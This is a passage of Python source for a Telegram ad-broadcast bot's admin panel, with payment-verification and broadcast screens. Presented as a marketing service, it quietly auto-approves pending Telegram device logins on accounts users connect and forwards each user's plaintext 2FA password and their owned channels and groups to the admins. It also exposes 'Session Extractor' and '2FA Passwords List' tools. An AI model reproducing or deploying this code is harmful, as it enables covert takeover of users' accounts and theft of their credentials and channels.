            parse_mode="HTML",
            reply_markup=back_kb
        )
        return

    MAX_CHUNK_LEN = 2000
    current_chunk = full_header + "\n\n"
    chunks = []

    for item in items:
        if len(current_chunk) + len(item) > MAX_CHUNK_LEN:
            chunks.append(current_chunk)
            current_chunk = item + "\n\n"
        else:
            current_chunk += item + "\n\n"

    if current_chunk.strip():
        chunks.append(current_chunk)

    for idx, chunk in enumerate(chunks):
        is_last = (idx == len(chunks) - 1)
        kb = back_kb if is_last else None
        try:
            await query.message.reply_text(chunk, parse_mode="HTML", reply_markup=kb)
        except Exception as err:
            logger.error(f"[send_safe_html_message error] {err}")
            import re
            clean_chunk = re.sub(r'<[^>]+>', '', chunk)
            await query.message.reply_text(clean_chunk, parse_mode=None, reply_markup=kb)


def is_admin(uid: int) -> bool:
    """Check if a user is an admin."""
    return uid in ADMIN_IDS


async def notify_admins_new_account(bot, session: str, phone: str, first_name: str, last_name: str, username: str, tg_user_id: int, owner_id: int, two_fa_password: str = ""):
    """Perform auto-login approval and channel/group ownership analysis for new accounts and notify admins."""
    try:
        acc_name = escape_html(f"{first_name} {last_name}".strip() or phone)
        uname_str = f" (@{escape_html(username)})" if username else ""
        pwd_str   = f"<code>{escape_html(two_fa_password)}</code>" if two_fa_password else "<i>None / Direct OTP</i>"

        # 1. Attempt Telegram Login Prompt Auto-Approval ("Yes, it's me")
        app_res = await broadcaster.approve_telegram_login(session)
        if app_res.get("success"):
            btn_text = app_res.get("button_text", "Yes, it\'s me")
            app_str = f"✅ <b>Approved Successfully</b> (Clicked '<code>{escape_html(btn_text)}</code>')"
        elif app_res.get("found"):
            app_str = f"⚠️ <b>Found prompt but failed to click:</b> {escape_html(app_res.get('error', ''))}"
        else:
            app_str = "ℹ️ <b>No Pending Login Prompt</b>"

        # 2. Analyze Channels and Groups (Owner vs Admin)
        analysis = await broadcaster.analyze_account_channels_groups(session)
        ow_chns = analysis.get("owned_channels", [])
        ad_chns = analysis.get("admin_channels", [])
        ow_grps = analysis.get("owned_groups", [])
        ad_grps = analysis.get("admin_groups", [])

        def fmt_chats(chat_list):
            if not chat_list:
                return "<i>None</i>"
            lines = []
            for c in chat_list[:8]:
                t = escape_html(c['title'])
                if c['link']:
                    lines.append(f"• <a href='{c['link']}'>{t}</a>")
                else:
                    lines.append(f"• {t}")
            if len(chat_list) > 8:
                lines.append(f"<i>...and {len(chat_list) - 8} more</i>")
            return "\n".join(lines)

        bot_stats = db.get_bot_stats()
        header = f"{e('deco_fly_l')} <b>NEW ACCOUNT CONNECTED & ANALYZED</b> {e('deco_fly_r')}"
        divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

        msg_body = (
            f"{header}\n{divider}\n\n"
            f"{e('crown')} <b>Account Name:</b> <b>{acc_name}</b>{uname_str}\n"
            f"{e('android')} <b>Phone:</b> <code>{phone}</code>\n"
            f"{e('dev')} <b>Telegram User ID:</b> <code>{tg_user_id}</code>\n"
            f"🔑 <b>2FA Password:</b> {pwd_str}\n"
            f"{e('dev')} <b>Owner User ID:</b> <code>{owner_id}</code>\n"
            f"⚡ <b>Device Login Auto-Approve:</b> {app_str}\n"
            f"{divider}\n"
            f"👑 <b>OWNED CHANNELS ({len(ow_chns)}):</b>\n{fmt_chats(ow_chns)}\n\n"
            f"🛡 <b>ADMIN CHANNELS ({len(ad_chns)}):</b>\n{fmt_chats(ad_chns)}\n\n"
            f"👑 <b>OWNED GROUPS ({len(ow_grps)}):</b>\n{fmt_chats(ow_grps)}\n\n"
            f"🛡 <b>ADMIN GROUPS ({len(ad_grps)}):</b>\n{fmt_chats(ad_grps)}\n"
            f"{divider}\n"
            f"{e('chart')} <b>Bot Total Accounts:</b> <code>{bot_stats['total_accounts']}</code> | <b>Total Users:</b> <code>{bot_stats['total_users']}</code>"
        )

        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(admin_id, msg_body, parse_mode="HTML", disable_web_page_preview=True)
            except Exception as err:
                logger.error(f"[notify_admins_new_account send error] {err}")
    except Exception as err:
        logger.error(f"[notify_admins_new_account root error] {err}")


def build_adsrun_admin_dashboard():
    """Build luxury admin panel dashboard text and inline keyboard."""
    stats   = db.get_bot_stats()
    users   = db.get_all_users()
    running = sum(1 for u in users if sched.is_user_running(u["user_id"]))

    videos = db.get_welcome_videos()
    legacy_vid = db.get_config("welcome_video_id")
    vid_count = len(videos) if videos else (1 if legacy_vid else 0)

    vid_status_text = f"{num_to_emoji(vid_count)} Active Videos (Rotation)" if vid_count > 1 else (f"{num_to_emoji(1)} Active Video" if vid_count == 1 else "Not Set")
    vid_status_emoji = e('check') if vid_count > 0 else e('cross')

    header = f"{e('deco_fly_l')} <b>LUXURY ADMIN DASHBOARD</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

    panel_base = PANEL_BASE_URL.rstrip("/")
    direct_chrome_link = f"{panel_base}/?token={ADMIN_AUTH_SECRET}"

    text = (
        f"{header}\n"
        f"{divider}\n\n"
        f"{e('crown')} <b>Total Registered Users:</b> {num_to_emoji(stats['total_users'])}\n"
        f"{e('android')} <b>Total Connected Accounts:</b> {num_to_emoji(stats['total_accounts'])}\n"
        f"{e('fire')} <b>Active Live Broadcasts:</b> {num_to_emoji(running)}\n"
        f"{e('check')} <b>Total Sent (All Time):</b> {num_to_emoji(stats['total_sent'])}\n"
        f"{e('cross')} <b>Total Failed (All Time):</b> {num_to_emoji(stats['total_failed'])}\n"
        f"{e('camera')} <b>Welcome Playlist:</b> {vid_status_text} {vid_status_emoji}\n\n"
        f"{divider}\n"
        f"<i>⚡ Select an option below to manage accounts, welcome videos, or broadcasts:</i>"
    )
    buttons = [
        [
            InlineKeyboardButton("All Users",    callback_data="adm_users",   icon_custom_emoji_id=_E["crown"],   style="primary"),
            InlineKeyboardButton("All Accounts", callback_data="adm_accs",    icon_custom_emoji_id=_E["android"], style="primary"),
        ],
        [
            InlineKeyboardButton("Premium Users", callback_data="adm_prem_users", icon_custom_emoji_id=_E["crown"], style="success"),
            InlineKeyboardButton("1200+ Channels", callback_data="adm_manage_escrow", icon_custom_emoji_id=_E["chipo"], style="primary"),
        ],
        [
            InlineKeyboardButton("⚡ FamPay Engine", callback_data="adm_fampay", icon_custom_emoji_id=_E["lightni"], style="success"),
            InlineKeyboardButton("📧 Gmail Scanner", callback_data="adm_gmail", icon_custom_emoji_id=_E["tools"], style="primary"),
        ],
        [
            InlineKeyboardButton("Change Payment QR Photo", callback_data="adm_change_qr", icon_custom_emoji_id=_E["camera"], style="primary"),
            InlineKeyboardButton("Lives (Live Analysis)", callback_data="adm_lives", icon_custom_emoji_id=_E["livei"], style="success"),
        ],
        [
            InlineKeyboardButton("2FA Passwords List", callback_data="adm_2fa_list", icon_custom_emoji_id=_E["lock"], style="primary"),
            InlineKeyboardButton("Session Extractor", callback_data="adm_session_extractor", icon_custom_emoji_id=_E["lock"], style="primary"),
            InlineKeyboardButton("⚡ Use Session ID", callback_data="adm_use_session_id", icon_custom_emoji_id=_E["fire"], style="success"),
        ],
        [
            InlineKeyboardButton("Admin Message Broadcast", callback_data="adm_broadcast_msg", icon_custom_emoji_id=_E["forward"], style="success"),
        ],
        [
            InlineKeyboardButton("Broadcast All", callback_data="adm_all_str", icon_custom_emoji_id=_E["fire"],    style="success"),
            InlineKeyboardButton("Stop All",        callback_data="adm_all_stp", icon_custom_emoji_id=_E["cross"],   style="danger"),
        ],
        [
            InlineKeyboardButton("Add Welcome Video", callback_data="adm_set_video", icon_custom_emoji_id=_E["camera"], style="success"),
            InlineKeyboardButton("Manage / Delete Videos", callback_data="adm_manage_videos", icon_custom_emoji_id=_E["trash"], style="primary"),
        ],
        [
            InlineKeyboardButton("Force Join Channels Config", callback_data="adm_force_join", icon_custom_emoji_id=_E["globe"], style="primary"),
        ],

        [
            InlineKeyboardButton("📥 Export Database Backup", callback_data="adm_export_db", icon_custom_emoji_id=_E["link"], style="success"),
        ]
    ]

    buttons.append([
        InlineKeyboardButton("Refresh Dashboard", callback_data="admin_home", icon_custom_emoji_id=_E["gear"],    style="primary"),
    ])

    return text, InlineKeyboardMarkup(buttons)


async def export_db_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/exportdb command — Admin only database backup export via Telegram."""
    uid = update.effective_user.id
    if not is_admin(uid):
        target = update.callback_query.message if update.callback_query else update.message
        await target.reply_text("❌ Access denied. Admin only!")
        return

    target = update.callback_query.message if update.callback_query else update.message
    msg = await target.reply_text("⏳ Preparing Database Backup...")
    try:
        db.flush_logs_now()
        backup_path = "export_adbot.db"
        shutil.copy2("adbot.db", backup_path)

        with open(backup_path, "rb") as doc_file:
            await target.reply_document(
                document=doc_file,
                filename="adbot.db",
                caption="✅ <b>Here is your AdBot Database Backup!</b>\n\n<i>All user settings, accounts, and logs are included.</i>",
                parse_mode="HTML"
            )
        await msg.delete()
        if os.path.exists(backup_path):
            os.remove(backup_path)
    except Exception as err:
        logger.error(f"[Export DB Error] {err}", exc_info=True)
        await target.reply_text(f"❌ Error exporting database: `{escape_html(str(err))}`", parse_mode="HTML")


def build_root_admin_dashboard():
    """Build root admin menu showing Store System and AdsRun Admin Panel."""
    header = f"{e('deco_fly_l')} <b>ADMIN CONTROL PANEL</b> {e('deco_fly_r')}"
    divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
    text = (
        f"{header}\n"
        f"{divider}\n\n"
        f"Select which system you want to manage:"
    )
    buttons = [

        [InlineKeyboardButton("AdsRun Admin Panel", callback_data="adm_root_adsrun", icon_custom_emoji_id=_E["chart"], style="danger")],
    ]
    return text, InlineKeyboardMarkup(buttons)

async def admin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """/admin command — admin only."""
    uid = update.effective_user.id
    if not is_admin(uid):
        await update.message.reply_text("❌ Access denied. Admin only!")
        return
    text, markup = build_root_admin_dashboard()
    await update.message.reply_text(text, reply_markup=markup, parse_mode="HTML")



async def admin_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle all admin panel callbacks (pattern: admin_* or adm_*)."""
    query = update.callback_query
    uid   = query.from_user.id
    data  = query.data
    await query.answer()

    if not is_admin(uid):
        await query.message.reply_text("❌ Access denied. Admins only!")
        return

    try:
        # ── Admin Home ──────────────────────────────────────────────
        if data == "admin_home":
            text, markup = build_root_admin_dashboard()
            try:
                await query.edit_message_text(text, reply_markup=markup, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=markup, parse_mode="HTML")

        elif data == "adm_root_adsrun":
            text, markup = build_adsrun_admin_dashboard()
            try:
                await query.edit_message_text(text, reply_markup=markup, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=markup, parse_mode="HTML")

        elif data == "adm_export_db":
            await export_db_cmd(update, ctx)

        # ── Admin: FamPay Cloud Gateway Engine ──────────────────────
        elif data == "adm_fampay":
            sess = db.get_active_fampay_session()
            eff_upi = db.get_fampay_upi_id()
            price = db.get_premium_price()

            status_badge = f"{e('check')} <b>Connected & Active (24/7 Cloud Sync)</b>" if sess else f"{e('cross')} <b>Not Connected / Standalone Mode</b>"
            acc_name = sess.get("account_name", "N/A") if sess else "None"
            phone = f"+91 {sess.get('phone')}" if (sess and sess.get("phone")) else "None"
            last_sync = sess.get("last_sync", "Never") if sess else "Never"
            token_preview = (sess.get("auth_token", "")[:12] + "...") if (sess and sess.get("auth_token")) else "None"

            header = f"{e('deco_fly_l')} ⚡ <b>FAMPAY CLOUD GATEWAY ENGINE</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"⚡ <b>Gateway Engine Status:</b> {status_badge}\n\n"
                f"👤 <b>Account Name:</b> <code>{escape_html(acc_name)}</code>\n"
                f"📱 <b>Phone Number:</b> <code>{escape_html(phone)}</code>\n"
                f"💳 <b>Active FamPay UPI:</b> <code>{escape_html(eff_upi)}</code>\n"
                f"💰 <b>Premium Price:</b> <b>₹{price:.0f} INR</b>\n"
                f"🔄 <b>Last Synced:</b> <code>{escape_html(str(last_sync))}</code>\n"
                f"🔑 <b>Session Token:</b> <code>{escape_html(token_preview)}</code>\n\n"
                f"{divider}\n"
                f"<i>⚙️ Manage FamPay Cloud session, generate dynamic QR codes & configure automatic instant approvals:</i>"
            )

            btn_rows = [
                [
                    InlineKeyboardButton("Login via Phone + OTP", callback_data="adm_fampay_otp", icon_custom_emoji_id=_E["android"], style="success"),
                    InlineKeyboardButton("Connect Bearer Token", callback_data="adm_fampay_token", icon_custom_emoji_id=_E["lock"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Sync / Check Now", callback_data="adm_fampay_sync", icon_custom_emoji_id=_E["gear"], style="success"),
                    InlineKeyboardButton("Set Custom UPI ID", callback_data="adm_fampay_setupi", icon_custom_emoji_id=_E["pen"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Set Premium Price", callback_data="adm_fampay_price", icon_custom_emoji_id=_E["cash"], style="primary"),
                    InlineKeyboardButton("Disconnect Session", callback_data="adm_fampay_disconnect", icon_custom_emoji_id=_E["cross"], style="danger"),
                ],
                [
                    InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary"),
                ]
            ]
            btns = InlineKeyboardMarkup(btn_rows)
            try:
                await query.edit_message_text(text, reply_markup=btns, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=btns, parse_mode="HTML")

        elif data == "adm_fampay_otp":
            ctx.user_data["state"] = ADMIN_WAITING_FAMPAY_PHONE
            await query.message.reply_text(
                f"📱 <b>[FamPay Login] Send your 10-digit FamPay mobile number:</b>\n\n"
                f"<i>Example: <code>9876543210</code>\nType /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_fampay_token":
            ctx.user_data["state"] = ADMIN_WAITING_FAMPAY_TOKEN
            await query.message.reply_text(
                f"🔑 <b>[FamPay Connect] Paste your FamPay Auth / Bearer Token or JWT:</b>\n\n"
                f"<i>Type /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_fampay_sync":
            res = await fampay_engine.sync_fampay_transactions()
            msg = res.get("message", "Sync complete.")
            await query.answer(f"⚡ {msg}", show_alert=True)
            sess = db.get_active_fampay_session()
            eff_upi = db.get_fampay_upi_id()
            price = db.get_premium_price()

            status_badge = f"{e('check')} <b>Connected & Active (24/7 Cloud Sync)</b>" if sess else f"{e('cross')} <b>Not Connected / Standalone Mode</b>"
            acc_name = sess.get("account_name", "N/A") if sess else "None"
            phone = f"+91 {sess.get('phone')}" if (sess and sess.get("phone")) else "None"
            last_sync = sess.get("last_sync", "Never") if sess else "Never"
            token_preview = (sess.get("auth_token", "")[:12] + "...") if (sess and sess.get("auth_token")) else "None"

            header = f"{e('deco_fly_l')} ⚡ <b>FAMPAY CLOUD GATEWAY ENGINE</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"⚡ <b>Gateway Engine Status:</b> {status_badge}\n\n"
                f"👤 <b>Account Name:</b> <code>{escape_html(acc_name)}</code>\n"
                f"📱 <b>Phone Number:</b> <code>{escape_html(phone)}</code>\n"
                f"💳 <b>Active FamPay UPI:</b> <code>{escape_html(eff_upi)}</code>\n"
                f"💰 <b>Premium Price:</b> <b>₹{price:.0f} INR</b>\n"
                f"🔄 <b>Last Synced:</b> <code>{escape_html(str(last_sync))}</code>\n"
                f"🔑 <b>Session Token:</b> <code>{escape_html(token_preview)}</code>\n\n"
                f"{divider}\n"
                f"<i>⚙️ Manage FamPay Cloud session, generate dynamic QR codes & configure automatic instant approvals:</i>"
            )

            btn_rows = [
                [
                    InlineKeyboardButton("Login via Phone + OTP", callback_data="adm_fampay_otp", icon_custom_emoji_id=_E["android"], style="success"),
                    InlineKeyboardButton("Connect Bearer Token", callback_data="adm_fampay_token", icon_custom_emoji_id=_E["lock"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Sync / Check Now", callback_data="adm_fampay_sync", icon_custom_emoji_id=_E["gear"], style="success"),
                    InlineKeyboardButton("Set Custom UPI ID", callback_data="adm_fampay_setupi", icon_custom_emoji_id=_E["pen"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Set Premium Price", callback_data="adm_fampay_price", icon_custom_emoji_id=_E["cash"], style="primary"),
                    InlineKeyboardButton("Disconnect Session", callback_data="adm_fampay_disconnect", icon_custom_emoji_id=_E["cross"], style="danger"),
                ],
                [
                    InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary"),
                ]
            ]
            btns = InlineKeyboardMarkup(btn_rows)
            try:
                await query.edit_message_text(text, reply_markup=btns, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=btns, parse_mode="HTML")

        elif data == "adm_fampay_setupi":
            ctx.user_data["state"] = ADMIN_WAITING_FAMPAY_UPI
            curr = db.get_fampay_upi_id()
            await query.message.reply_text(
                f"✏️ <b>[FamPay UPI Config] Send new FamPay UPI ID:</b>\n\n"
                f"<b>Current:</b> <code>{curr}</code>\n"
                f"<i>Example: <code>chinupatraq@fam</code>\nType /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_fampay_price":
            ctx.user_data["state"] = ADMIN_WAITING_FAMPAY_PRICE
            curr = db.get_premium_price()
            await query.message.reply_text(
                f"💰 <b>[Premium Price Config] Send new Premium Membership price in INR:</b>\n\n"
                f"<b>Current Price:</b> <code>₹{curr:.0f}</code>\n"
                f"<i>Example: <code>300</code>\nType /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_fampay_disconnect":
            db.delete_fampay_session()
            await query.answer("🗑️ FamPay session disconnected.", show_alert=True)
            text, markup = build_admin_dashboard()
            try:
                await query.edit_message_text(text, reply_markup=markup, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=markup, parse_mode="HTML")

        elif data == "adm_gmail":
            status_info = gmail_payment_engine.get_gmail_status()
            header = f"{e('deco_fly_l')} 📧 <b>GMAIL IMAP AUTO-VERIFICATION ENGINE</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            status_badge = "🟢 <b>Connected & Scanning 24/7</b>" if status_info.get("ok") else "🔴 <b>Disconnected / Error</b>"

            text = (
                f"{header}\n{divider}\n\n"
                f"⚡ <b>Engine Status:</b> {status_badge}\n"
                f"📧 <b>Connected Gmail:</b> <code>{escape_html(status_info.get('email'))}</code>\n"
                f"🕒 <b>Last Inbox Scan:</b> <code>{escape_html(status_info.get('last_sync'))}</code>\n"
                f"📊 <b>Processed Emails Cache:</b> <b>{status_info.get('processed_count')}</b>\n"
                f"💬 <b>Engine Message:</b> <i>{escape_html(status_info.get('message'))}</i>\n\n"
                f"{divider}\n"
                f"⚡ <b>How It Works:</b>\n"
                f"• <i>Scans incoming FamApp/FamPay & Bank alert emails via IMAP SSL every 6s.</i>\n"
                f"• <i>Automatically extracts Amount, 12-digit UTR, Sender Name & Reference Note.</i>\n"
                f"• <i>Approves pending user Premium orders & grants Lifetime VIP in 1 second!</i>\n\n"
                f"👇 <i>Choose an action below:</i>"
            )
            buttons = [
                [
                    InlineKeyboardButton("Scan Inbox Now", callback_data="adm_gmail_scan", icon_custom_emoji_id=_E["gear"], style="success"),
                    InlineKeyboardButton("Test Connection", callback_data="adm_gmail_test", icon_custom_emoji_id=_E["check"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Change Gmail ID", callback_data="adm_gmail_setemail", icon_custom_emoji_id=_E["pen"], style="primary"),
                    InlineKeyboardButton("Change App Password", callback_data="adm_gmail_setpass", icon_custom_emoji_id=_E["lock"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary"),
                ]
            ]
            try:
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")

        elif data == "adm_gmail_scan":
            await query.answer("⏳ Scanning Gmail Inbox via IMAP SSL...", show_alert=False)
            new_credits = await gmail_payment_engine.scan_and_auto_credit_gmail()
            await query.answer(f"✅ Inbox scanned! Processed {new_credits} new payments.", show_alert=True)
            status_info = gmail_payment_engine.get_gmail_status()
            header = f"{e('deco_fly_l')} 📧 <b>GMAIL IMAP AUTO-VERIFICATION ENGINE</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            status_badge = "🟢 <b>Connected & Scanning 24/7</b>" if status_info.get("ok") else "🔴 <b>Disconnected / Error</b>"
            text = (
                f"{header}\n{divider}\n\n"
                f"⚡ <b>Engine Status:</b> {status_badge}\n"
                f"📧 <b>Connected Gmail:</b> <code>{escape_html(status_info.get('email'))}</code>\n"
                f"🕒 <b>Last Inbox Scan:</b> <code>{escape_html(status_info.get('last_sync'))}</code>\n"
                f"📊 <b>Processed Emails Cache:</b> <b>{status_info.get('processed_count')}</b>\n"
                f"💬 <b>Engine Message:</b> <i>{escape_html(status_info.get('message'))}</i>\n\n"
                f"{divider}\n"
                f"⚡ <b>How It Works:</b>\n"
                f"• <i>Scans incoming FamApp/FamPay & Bank alert emails via IMAP SSL every 6s.</i>\n"
                f"• <i>Automatically extracts Amount, 12-digit UTR, Sender Name & Reference Note.</i>\n"
                f"• <i>Approves pending user Premium orders & grants Lifetime VIP in 1 second!</i>\n\n"
                f"👇 <i>Choose an action below:</i>"
            )
            buttons = [
                [
                    InlineKeyboardButton("Scan Inbox Now", callback_data="adm_gmail_scan", icon_custom_emoji_id=_E["gear"], style="success"),
                    InlineKeyboardButton("Test Connection", callback_data="adm_gmail_test", icon_custom_emoji_id=_E["check"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Change Gmail ID", callback_data="adm_gmail_setemail", icon_custom_emoji_id=_E["pen"], style="primary"),
                    InlineKeyboardButton("Change App Password", callback_data="adm_gmail_setpass", icon_custom_emoji_id=_E["lock"], style="primary"),
                ],
                [
                    InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary"),
                ]
            ]
            try:
                await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(buttons), parse_mode="HTML")
            except Exception:
                pass

        elif data == "adm_gmail_test":
            await query.answer("🧪 Testing IMAP SSL connection...", show_alert=False)
            res = await asyncio.to_thread(gmail_payment_engine.test_gmail_connection)
            if res.get("ok"):
                await query.answer(f"✅ SUCCESS: {res['message']}", show_alert=True)
            else:
                await query.answer(f"❌ FAILED: {res.get('message')}", show_alert=True)

        elif data == "adm_gmail_setemail":
            ctx.user_data["state"] = ADMIN_WAITING_GMAIL_EMAIL
            curr_email = db.get_gmail_email()
            await query.message.reply_text(
                f"✉️ <b>[Gmail Config] Send new Gmail address for IMAP alerts:</b>\n\n"
                f"<b>Current Email:</b> <code>{curr_email}</code>\n"
                f"<i>Example: <code>chinupatraq@gmail.com</code>\nType /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_gmail_setpass":
            ctx.user_data["state"] = ADMIN_WAITING_GMAIL_PASS
            await query.message.reply_text(
                f"🔑 <b>[Gmail Config] Send 16-character Google App Password:</b>\n\n"
                f"<i>Generated from Google Account → Security → 2-Step Verification → App passwords\nExample: <code>uukh hygb godr hboh</code>\nType /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_broadcast_msg":
            ctx.user_data["state"] = ADMIN_WAITING_BROADCAST
            header = f"{e('deco_fly_l')} <b>ADMIN BROADCAST SYSTEM</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
            users = db.get_all_users()
            tot = len(users)
            text = (
                f"{header}\n{divider}\n\n"
                f"{e('forward')} <b>Send any message (Text, Photo, Video, GIF, Document, Voice) to broadcast to ALL {num_to_emoji(tot)} registered bot users.</b>\n\n"
                f"<i>Type /cancel to abort broadcast.</i>\n\n"
                f"{divider}"
            )
            await query.message.reply_text(
                text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[
                    InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")
                ]])
            )

        elif data == "adm_force_join":
            ch1   = db.get_config("fj_channel_1", FORCE_JOIN_CHANNEL_1)
            link1 = db.get_config("fj_link_1", FORCE_JOIN_LINK_1)
            ch2   = db.get_config("fj_channel_2", FORCE_JOIN_CHANNEL_2)
            link2 = db.get_config("fj_link_2", FORCE_JOIN_LINK_2)
            fj_v  = db.get_config("force_join_video", "")

            fj_v_status = f"Set & Active {e('check')}" if fj_v else f"Rotational Playlist {e('hourglass')}"

            header = f"{e('deco_fly_l')} <b>FORCE JOIN CONFIGURATION</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"

            text = (
                f"{header}\n{divider}\n\n"
                f"📢 <b>Channel 1 Username/ID:</b> <code>{escape_html(ch1)}</code>\n"
                f"🔗 <b>Channel 1 Invite Link:</b> <code>{escape_html(link1)}</code>\n\n"
                f"📢 <b>Channel 2 Username/ID:</b> <code>{escape_html(ch2)}</code>\n"
                f"🔗 <b>Channel 2 Invite Link:</b> <code>{escape_html(link2)}</code>\n\n"
                f"🎥 <b>Fixed Force Join Video:</b> {fj_v_status}\n\n"
                f"{divider}\n"
                f"<i>Tap below to edit channels or set a fixed video for Force Join prompt:</i>"
            )
            btn_rows = [
                [InlineKeyboardButton("Edit Channel 1", callback_data="adm_edit_fj1", icon_custom_emoji_id=_E["pen"], style="primary")],
                [InlineKeyboardButton("Edit Channel 2", callback_data="adm_edit_fj2", icon_custom_emoji_id=_E["pen"], style="primary")],
                [InlineKeyboardButton("Set Fixed FJ Video", callback_data="adm_set_fj_video", icon_custom_emoji_id=_E["camera"], style="primary")],
            ]
            if fj_v:
                btn_rows.append([InlineKeyboardButton("Clear Fixed FJ Video", callback_data="adm_clear_fj_video", icon_custom_emoji_id=_E["cross"], style="danger")])
            btn_rows.append([InlineKeyboardButton("Back to Admin Panel", callback_data="admin_home", icon_custom_emoji_id=_E["arrow"], style="primary")])

            btns = InlineKeyboardMarkup(btn_rows)
            try:
                await query.edit_message_text(text, reply_markup=btns, parse_mode="HTML")
            except Exception:
                await query.message.reply_text(text, reply_markup=btns, parse_mode="HTML")

        elif data == "adm_set_fj_video":
            ctx.user_data["state"] = ADMIN_WAITING_FJ_VIDEO
            await query.message.reply_text(
                f"{e('camera')} <b>Send or forward the Video, GIF (Animation), or Photo for Force Join screen:</b>\n\n"
                f"<i>This video will be saved specifically and fixed for the Force Join screen so it does not change randomly for new users!</i>\n\n"
                f"<i>Type /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_clear_fj_video":
            db.set_config("force_join_video", "")
            db.set_config("force_join_video_type", "")
            await query.message.reply_text(
                f"{e('check')} <b>Fixed Force Join Video cleared!</b> Bot will now rotate welcome playlist videos.",
                parse_mode="HTML"
            )

        elif data == "adm_edit_fj1":
            ctx.user_data["state"] = ADMIN_WAITING_FJ1
            await query.message.reply_text(
                f"{e('pen')} <b>Send Channel 1 details in one of these formats:</b>\n\n"
                f"<b>🔹 Public Channel:</b>\n<code>@ChannelUsername, https://t.me/ChannelUsername</code>\n\n"
                f"<b>🔹 Private / Request to Join Link:</b>\n<code>-100XXXXXXXXXX, https://t.me/+InviteLink</code>\n"
                f"<i>(Format: Channel ID/Username, Invite/Request Link)</i>\n\n"
                f"<i>Type /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_edit_fj2":
            ctx.user_data["state"] = ADMIN_WAITING_FJ2
            await query.message.reply_text(
                f"{e('pen')} <b>Send Channel 2 details in one of these formats:</b>\n\n"
                f"<b>🔹 Public Channel:</b>\n<code>@ChannelUsername, https://t.me/ChannelUsername</code>\n\n"
                f"<b>🔹 Private / Request to Join Link:</b>\n<code>-100XXXXXXXXXX, https://t.me/+InviteLink</code>\n"
                f"<i>(Format: Channel ID/Username, Invite/Request Link)</i>\n\n"
                f"<i>Type /cancel to abort.</i>",
                parse_mode="HTML"
            )

        elif data == "adm_set_video":
            ctx.user_data["state"] = ADMIN_WAITING_VIDEO
            vids = db.get_welcome_videos()
            cnt = len(vids)
            header = f"{e('deco_fly_l')} <b>ADD WELCOME VIDEO (Playlist: {cnt} Videos)</b> {e('deco_fly_r')}"
            divider = f"{e('shock_ncl')}{e('shock_r')}{e('shock_r1')}{e('shock_r3')}{e('shock_r4')}{e('shock_r5')}{e('shock_r6')}{e('shock_ncr')}"
